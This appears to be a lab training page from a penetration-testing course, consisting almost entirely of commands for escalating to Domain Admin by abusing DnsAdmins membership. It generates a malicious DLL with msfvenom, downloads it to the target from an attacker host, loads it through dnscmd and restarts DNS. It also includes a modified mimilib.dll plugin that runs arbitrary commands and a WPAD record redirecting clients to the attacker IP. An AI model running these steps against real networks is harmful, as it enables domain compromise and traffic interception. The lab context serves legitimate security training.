## Leveraging DnsAdmins Access
#### Generating Malicious DLL

```shell
3kjS@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
#### Starting Local HTTP Server

```shell
3kjS@htb[/htb]$ python3 -m http.server 7777
```
#### Downloading File to Target

```powershell
PS C:\htb> wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```
#### Loading DLL as Non-Privileged User

```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```
#### Loading DLL as Member of DnsAdmins

```cmd
PS C:\htb> Get-ADGroupMember -Identity DnsAdmins
```
#### Loading Custom DLL

```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
#### Finding User's SID

```cmd
C:\htb> wmic useraccount where name="netadm" get sid 

SID 
S-1-5-21-669053619-2741956077-1013132368-1109
```
#### Checking Permissions on DNS Service

```cmd
C:\htb> sc.exe sdshow DNS
```
#### Stopping the DNS Service

```cmd
C:\htb> sc stop dns
```
#### Starting the DNS Service

```cmd
C:\htb> sc start dns
```
#### Confirming Group Membership

```cmd
C:\htb> net group "Domain Admins" /dom
```
## Cleaning Up
#### Confirming Registry Key Added

```cmd
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
#### Deleting Registry Key

```cmd
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```
#### Starting the DNS Service Again

```cmd
C:\htb> sc.exe start dns
```
#### Checking DNS Service Status

```cmd
C:\htb> sc query dns
```
## Using Mimilib.dll

```c
/*  Benjamin DELPY `gentilkiwi`
    https://blog.gentilkiwi.com
    benjamin@gentilkiwi.com
    Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");
    }
    return ERROR_SUCCESS;
}
```

```powershell
PS C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
#### Adding a WPAD Record

```powershell
PS C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
